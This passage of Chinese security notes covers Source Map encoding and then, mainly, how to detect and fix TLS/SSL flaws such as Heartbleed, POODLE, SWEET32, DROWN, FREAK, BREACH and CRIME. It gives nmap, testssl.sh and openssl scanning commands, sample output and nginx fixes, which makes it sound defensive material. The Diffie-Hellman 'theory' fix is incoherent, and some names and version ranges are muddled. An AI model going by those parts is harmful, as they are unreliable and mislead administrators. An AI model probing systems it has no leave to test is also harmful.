转换后的代码文件。 其他的生成方法可以参考这篇文章。 Source Map 的格式 打开 Source map 文件，它大概是这个样子： { 　　　　version : 3, 　　　　file: \"out.js\", 　　　　sourceRoot : \"\", 　　　　sources: [\"foo.js\", \"bar.js\"], 　　　　names: [\"src\", \"maps\", \"are\", \"fun\"], 　　　　mappings: \"AAgBC,SAAQ,CAAEA\" } 整个文件就是一个 JavaScript 对象，可以被解释器读取。它主要有以下几个属性： - version：Source map 的版本，目前为 3。 - file：转换后的文件名。 - sourceRoot：转换前的文件所在的目录。如果与转换前的文件在同一目录，该项为空。 - sources：转换前的文件。该项是一个数组，表示可能存在多个文件合并。 - names：转换前的所有变量名和属性名。 - mappings：记录位置信息的字符串，下文详细介绍。 mappings 属性 下面才是真正有趣的部分：两个文件的各个位置是如何一一对应的。 关键就是 map 文件的 mappings 属性。这是一个很长的字符串，它分成三层。 第一层是行对应，以分号（;）表示，每个分号对应转换后源码的一行。所以，第一个分号前的内容，就对应源码的第一行，以此类推。 第二层是位置对应，以逗号（,）表示，每个逗号对应转换后源码的一个位置。所以，第一个逗号前的内容，就对应该行源码的第一个位置，以此类推。 第三层是位置转换，以 VLQ 编码表示，代表该位置对应的转换前的源码位置。 举例来说，假定 mappings 属性的内容如下： mappings:\"AAAAA,BBBBB;CCCCC\" 就表示，转换后的源码分成两行，第一行有两个位置，第二行有一个位置。 说明：mappings:\"AAAAA,BBBBB;CCCCC\" 并不是按这个字母每一位的作用，而是需要先把内容变成二进制再根据 VLQ 规则解码出来后的第一位第二位才是每一位作用。实际的 mappings 中每一小段可能存在超过 5 个字符。 位置对应的原理 每个位置使用五位，表示五个字段。 从左边算起， 第一位，表示这个位置在（转换后的代码的）的第几列，是和前一个位置的相对列数量。 第二位，表示这个位置属于 sources 属性中的哪一个文件。 第三位，表示这个位置属于转换前代码的第几行。 第四位，表示这个位置属于转换前代码的第几列。 第五位，表示这个位置属于 names 属性中的哪一个变量。 有几点需要说明。首先，所有的值都是以 0 作为基数的。其次，第五位不是必需的，如果该位置没有对应 names 属性中的变量，可以省略第五位。再次，每一位都采用 VLQ 编码表示；由于 VLQ 编码是变长的，所以每一位可以由多个字符构成。 如果某个位置是 AAAAA，由于 A 在 VLQ 编码中表示 0，因此这个位置的五个位实际上都是 0。它的意思是，该位置在转换后代码的第 0 列，对应 sources 属性中第 0 个文件，属于转换前代码的第 0 行第 0 列，对应 names 属性中的第 0 个变量。 VLQ 编码 最后，如何用 VLQ 编码表示数值。 这种编码最早用于 MIDI 文件，后来被多种格式采用。它的特点就是可以非常精简地表示很大的数值。 VLQ 编码是变长的。如果（整）数值在-15 到 +15 之间（含两个端点），用一个字符表示；超出这个范围，就需要用多个字符表示。它规定，每个字符使用 6 个两进制位，正好可以借用 Base 64 编码的字符表。 在这 6 个位中，左边的第一位（最高位）表示是否\"连续\"（continuation）。如果是 1，代表这 ６ 个位后面的 6 个位也属于同一个数；如果是 0，表示该数值到这 6 个位结束。 Continuation |　　　　　Sign |　　　　　| V　　　　　V １０１０１１ 这 6 个位中的右边最后一位（最低位）的含义，取决于这 6 个位是否是某个数值的 VLQ 编码的第一个字符。如果是的，这个位代表\"符号\"（sign），0 为正，1 为负（Source map 的符号固定为 0）；如果不是，这个位没有特殊含义，被算作数值的一部分。 VLQ 编码：实例 下面看一个例子，如何对数值 16 进行 VLQ 编码。 第一步，将 16 改写成二进制形式 10000。 第二步，在最右边补充符号位。因为 16 大于 0，所以符号位为 0，整个数变成 100000。 第三步，从右边的最低位开始，将整个数每隔 5 位，进行分段，即变成 1 和 00000 两段。如果最高位所在的段不足 5 位，则前面补 0，因此两段变成 00001 和 00000。 第四步，将两段的顺序倒过来，即 00000 和 00001。 第五步，在每一段的最前面添加一个\"连续位\"，除了最后一段为 0【上面说了 0 表示不连续】，其他都为 1，即变成 100000 和 000001。 第六步，将每一段转成 Base 64 编码。 查表可知，100000 为 g，000001 为 B。因此，数值 16 的 VLQ 编码为 gB。上面的过程，看上去好像很复杂，做起来其实很简单，具体的实现请看官方的 base64-vlq.js 文件，里面有详细的注释。 0x00 前人栽树 JavaScript Source Map 详解 -- 推荐阅读 谈谈我是如何获得知乎的前端源码的 - 知乎 (zhihu.com) -- 推荐阅读 https://github.com/mozilla/source-map (83 条消息) sourcemap 文件泄露漏洞js.map 文件泄露小心灵呀的博客-CSDN 博客 -- 推荐阅读 hey,我能看到你的源码哎 -- 大佬 http://www.luckysec.cn/posts/531d91e3.html#toc-heading-3 https://github.com/D-kylin/note/blob/master/VLQ%E7%BC%96%E7%A0%81.md Introduction To JavaScript Source Maps Source Map Revision 3 Proposal Copyright & Copy zha0cai all right reserved，powered by Gitbook该文件修订时间： 2023-05-16 23:46:49 "},"web/TLS SSL 常见漏洞检测及修复方法.html":{"url":"web/TLS SSL 常见漏洞检测及修复方法.html","title":"TLS/SSL 常见漏洞检测及修复方法","keywords":"","body":"0x01 常见漏洞 CVE-2014-0160 - 心脏滴血漏洞 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160 漏洞描述 主要出现在 OpenSSL 处理 TLS 心跳的过程中，TLS 心跳的流程是：A 向 B 发送请求包，B 收到包后读取这个包的内容(data)，并返回一个包含有请求包内容的响应包。请求包的内容(data)中包含有包的类型(type)和数据长度等信息。 Heartbleed 漏洞是由于未能在 memcpy()​​​​ 调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪 OpenSSL 所分配的 64KB​​ 缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存内容，这样一来受害者的内存内容就会以每次 64KB​​ 的速度进行泄露。我们可以通过该漏洞读取每次攻击泄露出来的信息，所以可能也可以获取到服务器的私钥，用户 cookie 和密码等。 测试方法 在线测试：Heartbleed OpenSSL extension testing tool, CVE-2014-0160 (possible.lv) # testssl.sh ./testssl.sh -H TARGET(ip:port/域名) # nmap nmap -p 443 --script ssl-heartbleed --script-args vulns.showall 10.x.x.x Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-01-20 22:45 EST Nmap scan report for 10.0.1.159 Host is up (0.00028s latency). PORT STATE SERVICE 443/tcp open https | ssl-heartbleed: | VULNERABLE: | The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption. | State: VULNERABLE | Risk factor: High | OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves. | | References: | http://www.openssl.org/news/secadv_20140407.txt | http://cvedetails.com/cve/2014-0160/ |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160 MAC Address: 00:0C:29:35:3D:E8 (VMware) Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds 修复方法 升级 openssl 到 1.01g 及以上版本 CVE-2015-2808 - BAR-MITZVAH 攻击漏洞【原理扫描】 漏洞描述 该漏洞是由功能较弱而且已经过时的 RC4 加密算法中一个问题所导致的。它能够在某些情况下泄露 SSL/TLS​​ 加密流量中的密文，从而将账户用户名密码、信用卡数据和其他敏感信息泄露给黑客。 测试方法 openssl s_client -connect host:443 -cipher RC4 # 返回内容出现 handshake failure 说明 RC4 已禁用，否则需要修复 修复方法 服务器端禁止使用 RC4 加密算法。 客户端应在浏览器 TLS 配置中禁止 RC4 在 nginx 配置参数 ssl_ciphers​​ 中添加 !RC4​​ 参数 ssl_ciphers ALL:!RC4​​ CVE-2013-2566 - SSL/TLS RC4 信息泄露漏洞【原理扫描】 漏洞描述 TLS 协议和 SSL 协议中使用的 RC4 算法具有许多单字节偏移。远程攻击者可以通过使用相同明文的大量会话中的密文统计分析来进行明文破解攻击。 测试方法 # testssl.sh ./testssl.sh -4 TARGET # nmap 使用 ./testssl.sh -E TARGET 手动枚举服务器密码或者 nmap -p 443 --script=ssl-enum-ciphers TARGET 确保服务器支持密码类型不使用 RC4 修复方法 同上 https://support.microsoft.com/en-us/help/2868725/microsoft-security-advisory-update-for-disabling-rc4 https://www.cnblogs.com/tsimfeiwan/p/16567279.html CVE-2016-2183 - SSL/TSL 协议信息泄露【原理扫描】-- SWEET32 漏洞描述 64 位块大小（如 Triple-DES（3DES））的传统块密码在 CBC 模式下使用，易受到攻击。当使用 CBC 模式操作时，使用 simple birthday attack 来识别 64 位块密码冲突。当碰撞发生时，这意味着输入与输出相同，使得可以执行 BEAST style attack 来渗透加密的数据。 作者 Karthik Bhargavan 和 Gaetan Leurent 能够在浏览器（作为 MITM）中运行 JavaScript，并发送大量的数据导致冲突，然后使用此信息来恢复会话 cookie。 测试方法 确定服务器是否支持 Triple-DES​​ 密码，如果服务器支持 Triple-DES​​，则易受 SWEET32 攻击。 # testssl.sh ./testssl.sh --ciphers TARGET # 如果输出显示 Tripe DES 密码，就像下面的截图一样，目标服务器容易受到 SWEET32 的影响，使用 3DES 的任何密码都易受 SWEET32 影响 # nmap nmap --script = ssl-enum-ciphers -p443 TARGET nmap -sV --script ssl-enum-ciphers -p 443 www.example.com (ip 也可以) # 输出以下则表示有漏洞 warnings: | 64-bit block cipher 3DES vulnerable to SWEET32 attack # 手工测试：根据上面方法测试用 Nmap NSE 脚本枚举密码 修复方法 升级 OpenSSL 版本【最优解】or 修改 Nginx 加密算法 OpenSSL 1.1.0 以后没有此漏洞，并且本地的 openssl 版本高于 1.1.0 https://www.openssl.org/news/secadv/20160922.txt 绿盟还是能扫描出来，因为 nginx 还在使用旧版本的 OpenSSL，优先升级 OpenSSL。(这个加密算法是跟 443 端口相关，有的项目没有做 https 所以没法修改只能升级) -- 突出一个【原理扫描（版本）】 下载 openssl 的稳定版本 https://www.openssl.org/ wget https://www.openssl.org/source/openssl-1.1.1g.tar.gz --no-check-certificate 编译安装 ```shell tar xvf openssl-1.1.1g.tar.gz -C /usr/local/ cd /usr/local/openssl-1.1.1g/ ./config && make && make install echo \"/usr/local/lib64/\" >> /etc/ld.so.conf ldconfig mv /usr/bin/openssl /usr/bin/openssl.old ln -sv /usr/local/bin/openssl /usr/bin/openssl - ​openssl version​​​，查看版本 - 替换 nginx 的 OpenSSL 旧版本为新版本，需要重新编译一下 nginx ```shell ./configure --user=www --group=www --prefix=/data/nginx --with-http_sub_module --with-http_stub_status_module --with-pcre --with-http_ssl_module --with-http_flv_module --with-http_gzip_static_module --with-http_realip_module --with-stream --with-stream_ssl_module --with-openssl=/usr/local/openssl-1.1.1g && make && make install pkill -9 nginx ./nginx 查看 nginx 的 openssl 版本 ./nginx -V​​​ nginx 开启的 443 端口，所以需要去修改 nginx 的配置文件，禁用 3DES 算法。【注】: !3DES​​ 是后添加的过滤 # nginx.conf 文件如下： server { ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4:!3DES; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; } ./nginx -s reload 原文链接：https://blog.csdn.net/w184414332/article/details/126406154 CVE-2015-4000 - LogJam 中间人安全限制绕过漏洞【原理扫描】 漏洞描述 该漏洞可帮助攻击者将 TLS 连接降级为 512 位导出级加密。这有助于攻击者读取和修改通过网络连接传输的任何数据。 TLS 1.2 及更早版本，在服务器上启用但不在客户端启用 DHE_EXPORT​​ 密码组时，没有正确转送 DHE_EXPORT​​ 选择，中间人攻击者通过用 DHE_EXPORT​​ 代替 DHE，重写 ClientHello，然后用 DHE 代替 DHE_EXPORT​​，重写 ServerHello(即\"Logjam\"问题)，利用此漏洞可执行密码降级攻击。 测试方法 # testssl.sh ./testssl.sh -J TARGET # nmap 禁用 EXPORT 密码，说明与 FREAK 攻击相同。 修复方法 禁用 EXPORT 密码（​SSLCipherSuite !EXPORT​​）或者升级 openssl 到安全版本 参考连接 How to test Logjam Attack (CVE-2015-4000) and fix? (geekflare.com) Logjam：TLS 漏洞 (CVE-2015-4000) CVE-2016-0800 - DROWN 跨协议攻击 TLS （溺水攻击/溺亡攻击） 漏洞描述 DROWN（使用过时和弱化的 eNcryption 解密 RSA），DROWN 攻击的最一般变体利用了 SSLv2 协议的一个根本缺点，允许中间人（MITM）攻击者利用导入符合 20 世纪 90 年代美国政府的限制（EXPORT 等级加密在下面的 FREAK 漏洞描述中详细描述）的密码学，可造成 DROWN 攻击(Decrypting RSA usingObsolete and Weakened eNcryption)。 测试方法 # testssl.sh ./testssl.sh -D TARGET # nmap nmap -p 443 -sV --script=sslv2-drown # 针对 Web Server openssl s_client -connect 待测域名或IP:443-ssl2 # 针对 SMTP Server openssl s_client -connect 待测域名或IP:25-starttls smtp -ssl2 # 如果出现如下错误信息，则 SSLv2 已禁用 419:error:1407F0E5:SSL routines:SSL2_WRITE:ssl handshake failure:s2_pkt.c:428: 修复方法 如果是 cipher none 的话，能保证是不受影响的，或者说这是一个缓解措施。 OpenSSL not 1.0.2a、1.0.1m、1.0.0r、0.9.8zf 及更早版本 (转)OpenSSL CVE-2016-0800 和 CVE-2016-0703 漏洞修复细节拾趣 - liujiacai - 博客园 (cnblogs.com) CVE-2015-0204 - OpenSSL FREAK Attack 漏洞描述 FREAK（破解 RSA 导出密钥），利用了 TLS/SSL​​ 中的加密弱点，这是美国政府几十年前最初引入的。使用 RSA_EXPORT​​ 密钥的想法是允许导出包含不能被大多数计算机破解的加密密钥。如果 RSA_EXPORT​​ 密钥加密为 512 位或更少，那么以目前的计算机性能很容易破解。 FREAK 执行降级攻击（强制服务器使用较弱的密码），当与中间人（MITM）类型攻击相结合时，这允许攻击者捕获数据并中断弱密钥的解密。 此问题存在于 OpenSSL 版本 0.9.8zd 之前, 或 1.0.0p 之前的 1.0.0，或 1.0.1k 之前的 1.0.1。 测试方法 # testssl.sh ./testssl -F TARGET # nmap 使用 ./testssl.sh -E TARGET 或者 nmap -p 443 --script=ssl-enum-ciphers TARGET 枚举服务器密码，确保服务器支持的以下类型密码不包含：EXPORT openssl s_client -connect www.fbi.gov:443 -cipher EXPORT # 如果你看到 \"alert handshake failure\" 这句话就说明该网站是安全的 修复方法 禁用 EXPORT 密码或者升级 openssl 到安全版本 ​SSLCipherSuite HIGH:!aNULL:!MD5:!EXP​​ OpenSSL FREAK Attack 漏洞(CVE-2015-0204)检测方法及修复建议 - SecPulse.COM | 安全脉搏 CVE-2014-3566 - POODLE SSLv3 攻击信息泄露漏洞【原理扫描】（卷毛狗攻击） 漏洞描述 该漏洞只对 CBC 模式的明文进行了身份验证，但是没有对填充字节进行完整性验证，攻击者可以发动中间人攻击拦截用户浏览器和 HTTPS 站点的流量，然后窃取用户的敏感信息。 Google 的安全小组在 2014 年 10 月 14 日发现了 POODLE 攻击（Padding Oracle On Downgraded Legacy Encryption）。该漏洞利用了 SSLv3 处理填充字节的方式（密码块链接）CBC 操作模式。 该缺陷允许中间人（MITM）攻击者在少于 256 个 SSLv3 连接中解密密文的所选字节，如果他们能够强制受害者应用程序重复发送相同的数据通过新创建 SSL 3.0 连接。 测试方法 ​testssl.sh​​ ./testssl.sh -O TARGET Kali 附带的 openssl 版本不再支持 SSLv3。 使用二进制码 testssl.sh/bin/openssl.Linux.x86_64​​ 进行手动 SSLv3 测试。 ./openssl.Linux.x86_64 s_client -ssl3 -connect 10.0.1.159:443 如果握手完成，则服务器容易受到 POODLE 的影响。 对于容易受到 POODLE 影响的服务器的输出示例（从响应中删除的证书）： --- No client certificate CA names sent Server Temp Key: DH, 1024 bits --- SSL handshake has read 1398 bytes and written 373 bytes --- New, TLSv1/SSLv3, Cipher is DHE-RSA-AES256-SHA Server public key is 1024 bit Secure Renegotiation IS supported Compression: NONE Expansion: NONE No ALPN negotiated SSL-Session: Protocol : SSLv3 Cipher : DHE-RSA-AES256-SHA Session-ID: 0450660185C7B2623CB2145A1C6655BDD8CC281F882C3B9E0ED35E88360639BA Session-ID-ctx: Master-Key: 6A56AC01754D9441ACFD6C0B9E534E33450CD2F0E0D619F235E2ACC1780CFD86E769B9AE82D0D5AAA4C62B295B5BB598 Key-Arg : None PSK identity: None PSK identity hint: None SRP username: None Start Time: 1484971085 Timeout : 7200 (sec) Verify return code: 9 (certificate is not yet valid) --- 如果服务器不容易受到 POODLE 的影响，握手将失败，发生如下错误 CONNECTED(00000003) 28395584:error:14094410:SSL routines:ssl3_read_bytes:sslv3 alert handshake failure:s3_pkt.c:1475:SSL alert number 40 28395584:error:1409E0E5:SSL routines:ssl3_write_bytes:ssl handshake failure:s3_pkt.c:656: --- no peer certificate available ​nmap​​ # nmap nmap -p 443 --script ssl-poodle --script-args vulns.showall 10.0.1.159 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-01-20 22:50 EST Nmap scan report for 10.0.1.159 Host is up (0.00037s latency). PORT STATE SERVICE 443/tcp open https | ssl-poodle: | VULNERABLE: | SSL POODLE information leak | State: VULNERABLE | IDs: CVE:CVE-2014-3566 OSVDB:113251 | The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other | products, uses nondeterministic CBC padding, which makes it easier | for man-in-the-middle attackers to obtain cleartext data via a | padding-oracle attack, aka the \"POODLE\" issue. | Disclosure date: 2014-10-14 | Check results: | TLS_RSA_WITH_AES_128_CBC_SHA | References: | http://osvdb.org/113251 | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566 | https://www.imperialviolet.org/2014/10/14/poodle.html |_ https://www.openssl.org/~bodo/ssl-poodle.pdf MAC Address: 00:0C:29:35:3D:E8 (VMware) Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds 修复方法 禁用 sslv3.0 协议 CVE-2014-8730 - POODLE TLS（TLS 卷毛狗攻击） 漏洞描述 由于 TLS 填充是 SSLv3 的一个子集，因此可以重新使用针对 TLS 的 POODLE 攻击。TLS 对于它的填充格式是非常严格的，但是一些 TLS 实现在解密之后不执行填充结构的检查。即使使用 TLS 也不会容易受到 POODLE 攻击的影响。 资料来源：https://blog.qualys.com/ssllabs/2014/12/08/poodle-bites-tls 测试方法 openssl s_client -connect host:端口 # 输入 R 进行重协商，可重协商 10 次以上且连接未断开，证书链中的自签名证书，重协商成功，漏洞存在 # testssl.sh ./testssl.sh -R ip:port 修复方法 同上 CVE - CVE-2014-8730 (mitre.org) CVE-2013-3587 - BREACH（野兽攻击） 漏洞描述 BREACH 代表通过自适应压缩超文本进行浏览器检测和渗透。与 CRIME 相似之处是利用 HTTP 压缩中的漏洞，允许攻击者识别页面中是否存在文本。 测试方法 BREACH 攻击基本流程 当页面上发生文本重复时，将删除重复的术语，有助于减小页面的大小。这可以用于识别现有的页面内容，下面是 Web 应用程序的示例，显示当前登录的用户在页面中反映的用户名： 输入您认为不存在于搜索参数中的用户名 注意返回页面的大小 发送您认为存在的用户名的其他搜索请求 注意返回页面的大小，如果用户名与登录用户名匹配（确认存在），页面大小对比上次将会缩小 通过分析响应的大小可以预测文本，实际上没有流量被“解密” 为了使 BREACH 攻击成功地渗透数据，必须有一种机制来反映渲染页面中的用户输入，并且服务器必须支持 HTTP 压缩。 # testssl.sh ./testssl.sh -B TARGET # 使用 openssl client openssl s_client -connect TARGET:443 输入以下内容来确定服务器是否使用压缩： GET / HTTP / 1.1 Host: TARGET Accept-Encoding: compress, gzip ======== e.g. GET / HTTP/1.1 Host: 192.168.201.216:9443 Accept-Encoding: compress, gzip 如果服务器返回乱码的字符，如下面的截图所示，则服务器支持压缩，容易受到 BREACH 的攻击。 testssl.sh​​ 测试 修复方法 How to fix the BREACH vulnerability (CVE-2013-3587 CWE-310) (port135.com) https://www.breachattack.com/ 禁用 HTTP 压缩 将秘密与用户输入分开 根据请求随机化秘密 屏蔽秘密（通过 XORing 与每个请求的随机秘密有效地随机化） 使用 CSRF 保护易受攻击的页面 长度隐藏（通过向响应添加随机数量的字节） 对请求进行速率限制 第一个选项（禁用 HTTP 压缩）肯定会缓解此漏洞，并且扫描工具不会再显示它。但是，这可能会影响性能 2 - 5 的建议与应用程序的编码有关。它们可有效防止此类攻击。它们也是一般开发的最佳实践 建议 #6​​ 和 #7​​ 是与托管相关的设置。 安全版本 OpenSSL 1.0.1k OpenSSL 1.0.0p OpenSSL 0.9.8zd CVE-2012-4929 - CRIME（罪恶攻击） 漏洞描述 CRIME 是 TLS 1.2 漏洞，允许中间人（MITM）攻击者识别加密数据，（潜在）执行会话劫持。攻击者可以通过检查密文的大小来识别加密数据，同时从浏览器引入多个有效载荷，当字符匹配在标题内时，其大小会有所不同，允许攻击者修改会话 cookie。实际上没有使用 CRIME 攻击解密数据，TLS 1.2 处理压缩的一个弱点使得攻击者可以通过比较返回的大小来识别头文件何时存在。 测试方法 # testssl.sh ./testssl.sh -C TARGET # 使用 openssl client，kali 使用的 openssl 似乎不再允许 TLS 1.2 压缩。如果您使用此版本的 openssl 进行测试，即使目标服务器启用了 TLS 1.2 压缩，响应将始终为 “Compression：NONE”。可以使用 testssl.sh 附带的 openssl.Linux.x86_64 二进制文件来解决此问题。 ./bin/openssl.Linux.x86_64 s_client -connect 10.0.1.158:443 # 示例输出 – 不易受 CRIME 影响 如果服务器不容易受到 CRIME 的影响。“压缩：无”表示压缩在服务器上被禁用，并且不易受到 CRIME 的攻击。 Compression: NONE # 示例输出 – 易受 CRIME 影响 如果服务器易受 CRIME 攻击： Compression: zlib compression 修复方法 SSL 压缩在下述版本是默认关闭的： nginx 1.1.6 及更高/1.0.9 及更高（如果使用了 OpenSSL 1.0.0 及更高）， nginx 1.3.2 及更高/1.2.2 及更高（如果使用较旧版本的 OpenSSL）。 CVE-2016-2107 - SSL 3.0 降级加密协议 Openssl Padding Oracle 漏洞 漏洞描述 当浏览器进行 HTTPS 连接失败的时候，将会尝试使用旧的协议版本，这其中就包括 SSL 3.0，于是加密协议由更加安全的协议（比如：TLS 1.0）降级成 SSL 3.0。然后利用 SSLv3 中存在的漏洞，解密得到其数据包的明文信息，而这些明文信息极有可能是用户的隐私数据，比如 cookie，这样攻击者就可以拿到这些隐私数据，进行更深层次的攻击。 OpenSSL CVE-2016-2107 漏洞分析 受影响的版本范围 ( 1.0.1—1.0.1f / 1.0.2 Beta1​​ ) 测试方法 在线测试 CVE-2016-2107 test（专项测试） SSL Server Test（国内） SSL Server Test（国外） 本地测试 git clone https://github.com/FiloSottile/CVE-2016-2107 # 然后进入 CVE-2016-2107 文件夹，执行命令 go run main.go jdddd.com ======== $ go version go version go1.6.2 darwin/amd64 $ go get github.com/FiloSottile/CVE-2016-2107 $ CVE-2016-2107 filippo.io 2016/05/03 17:50:49 Vulnerable: false 修复方法 确认 443 端口被哪个服务调用，然后更新该程序所依赖的 OpenSSL（不一定是系统自带的 OpenSSL）。 推荐把 OpenSSL 版本更新到最新版本 OpenSSL 1.0.2 应升级到 1.0.2h 或以上 OpenSSL 1.0.1 应升级到 1.0.1t 或以上 OpenSSL 1.0.0 应升级到 1.0.1t 或以上 更新完毕后，请重启调用 443 端口的服务。 SSL/TSL 瞬时 Diffie-Hellman 公共密钥过弱【原理扫描】 漏洞描述 Diffie-Hellman 协议用于生成公共密钥对，以确保通信双方交换的密钥是安全的。其原理是：在两个节点之间交换一些随机数，然后使用这些随机数计算出一个固定的椭圆曲线参数（ECC），接着生成两个大质数 p 和 q，它们将成为 Diffie-Hellman 密钥交换的基础。在实际使用中，由于计算 ECC 的过程中可能存在误差，导致生成的密钥可能存在一定程度的弱点。 测试方法 nmap -sV -Pn --script ssl-dh-params 端口 IP 修复方法 理论 增加密钥长度：为了提高密钥的安全性，可以增加密钥长度。具体实现方法如下：一种简单的方法是将原始椭圆曲线参数扩展为 n 个点，每个点的离散距离为 r=h/(2^n)，其中 h 为大素数。另一种更复杂的方法是使用 RSA 加密算法中的大质数分解技术生成两个大质数 p 和 q。这些大质数将成为 Diffie-Hellman 密钥交换的基础。 选择更好的证书：为了避免证书被伪造或篡改，可以选择更好的证书。 使用 Diffie-Hellman 签名：为了保证通信双方交换的密钥是安全的，可以使用 Diffie-Hellman 签名来验证密钥交换过程中是否存在误差。具体实现方法如下：首先计算出每个节点生成的随机数 a 和 b，并使用公钥对它们进行加密生成公钥（e 和 d）。接着计算出私钥（d 和 c）并进行签名，即 e 和 d。通信双方将这两个签名与发送方交换的私钥对比，如果相同则认为无误差发生；如果不相同，则存在误差存在需要进行重传。 实践 https://weakdh.org/sysadmin.html Nginx 配置 # 1. 生成 dhparams.pem cd /usr/local/nginx/conf openssl dhparam -out dhparams.pem 2048 chmod -R 755 dhparams.pem # 编辑 nging.conf 文件，添加 ssl_dhparam {path to dhparams.pem}; ssl_dhparam /usr/local/nginx/conf/dhparams.pem; # 重启 nginx sudo nginx -s reload CVE-2014-0224 - CCS 注入漏洞 漏洞描述 某些版本的 OpenSSL 存在弱点，允许客户端和服务器通过特制的握手包来强制使用弱密钥进行通信。 在客户端和服务端握手阶段，OpenSSL 协议不合时宜地接受密码更换说明(ChangeCipherSpec :CCS​​)，而产生了该漏洞。攻击者可以发起中间人攻击并利用此漏洞篡改或监听 SSL 加密传输的数据。不受影响的 OpenSSL 版本： OpenSSL before 0.9.8za OpenSSL 1.0.0 before 1.0.0m OpenSSL 1.0.1 before 1.0.1 受影响的版本包括： OpenSSL 1.0.1 through 1.0.1g OpenSSL 1.0.0 through 1.0.0l all versions before OpenSSL 0.9.8y 资料来源 https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-0224 https://www.openssl.org/news/secadv/20140605.txt 测试方法 # testssl.sh ./testssl.sh -I TARGET # nmap nmap -p 443 --script = ssl-ccs-injection TARGET nmap -sV -Pn --script ssl-ccs-injection 端口 IP 修复方法 使用 ldd nginx​​ 指令检查是否有的 libssl.so​​ 和 libcrypto.so​​ 的调用，如果用，直接升级 openssl 就可以了，如果没有，那么需要重新编译 Nginx。 https://cloud.baidu.com/doc/CAS/s/Gkhlqq92f CVE-2009-3555 - Renegotiation 漏洞描述 2009 年发现一个利用 TLS 和 SSL 协议 Renegotiation 的漏洞，允许攻击者将数据插入会话可危及其完整性。 必须满足以下条件才能利用此漏洞 服务器不支持 secure renegotiation​​ 服务器必须允许 client side renegotiation​​ 测试方法 ┌──(root㉿kali)-[/home/testssl.sh] └─# ./testssl.sh -R 192.168.201.216:9443 ########################################################### testssl.sh 3.2rc2 from https://testssl.sh/dev/ (f716193 2023-05-16 10:44:56) This program is free software. Distribution and modification under GPLv2 permitted. USAGE w/o ANY WARRANTY. USE IT AT YOUR OWN RISK! Please file bugs @ https://testssl.sh/bugs/ ########################################################### Using \"OpenSSL 1.0.2-bad (1.0.2k-dev)\" [~183 ciphers] on kali:./bin/openssl.Linux.x86_64 (built: \"Sep 1 14:03:44 2022\", platform: \"linux-x86_64\") Start 2023-05-23 05:38:17 -->> 192.168.201.216:9443 (192.168.201.216) > 192.168.201.216:9443 (192.168.201.216) 使用 openssl client 测试 openssl s_client -connect TARGET:443 Secure Renegotiation 启用 测试 Client Initiated Secure Renegotiation​​ openssl s_client -connect TARGET：443 类型： HEAD / HTTP / 1.1 R 如果你看到响应： HEAD / HTTP / 1.1 R RENEGOTIATING 即服务器允许 client renegotiation​​。 如果你看到回应： HEAD / HTTP/1.1 R RENEGOTIATING 139681067286040:error:1409E0E5:SSL routines:ssl3_write_bytes:ssl handshake failure:s3_pkt.c:656: 则服务器不支持 client renegotiation​​。 修复方法 建议升级 openssl 来进行修复，openssl-0.98m 之后的版本就已经修复了该漏洞，使用了 Secure Renegotiation。 其他 # 验证 ssl-cert 证书问题可以使用 nmap -sV -Pn --script ssl-cert 端口 IP # 验证 SSL 证书的有限期可以使用 nmap -sV -Pn --script ssl-date 端口 IP # 验证 Debian OpenSSL keys 可使用 nmap -sV -Pn --script ssl-known-key 端口 IP # 验证 CVE-2014-0160 OpenSSL Heartbleed bug 可使用 nmap -sV -Pn --script ssl-heartbleed 端口 IP ======== # 测试单个主机上的所有内容并输出到控制台 ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST # 测试单个主机上的所有内容并输出到 HTML ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha> OUTPUT-FILE.html # 测试子网上的所有主机并输出到 HTML ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U 192.168.1.0/24 | aha> OUTPUT-FILE.html # 与上述相同，但只列举每个服务器支持的密码类型 ./testssl.sh -E 192.168.1.0/24 | aha> OUTPUT-FILE.html 0x02 检测方法 使用 NMAP 检测 Window 需要下载安装 nmap，官网地址：https://nmap.org/download.html kali 可直接使用 nmap -sV --script ssl-enum-ciphers 端口 IP ┌──(root㉿kali)-[/home/testssl.sh] └─# nmap -sV --script ssl-enum-ciphers 9443 192.168.201.216 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 03:19 EDT 使用 testssl.sh 工具 testssl.sh 可以对 TLS/SSL Server​​ 端 Cipher、Protocol 进行检测，还可以进行 CCS 注入（CCS injection）、Heartbleed 等安全漏洞测试，功能全面丰富，可运行在 Linux/BSD​​ 端，目前可以说是 TLS Server 端首选的测试工具。。 官网：https://testssl.sh/ GitHub：https://github.com/drwetter/testssl.sh git clone --depth 1 https://github.com/drwetter/testssl.sh.git ┌──(root㉿kali)-[/home] └─# cd testssl.sh ┌──(root㉿kali)-[/home/testssl.sh] └─# ./testssl.sh -U 172.16.10.160 # 测试子网上的所有主机并输出到 HTML ./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U 192.168.1.0/24 | aha> OUTPUT-FILE.html 其中常用的有 ​-E​​​​, --cipher-per-proto checks those per protocol, 检测各 Protocol ciphersuites 加密算法套件 ​-P​​​​, --server-preference displays the server’s picks: protocol+cipher，Server 的首选协议 + 密码 ​-S​​​​, --server-defaults displays the server’s default picks and certificate info，Server 的默认选择和证书信息 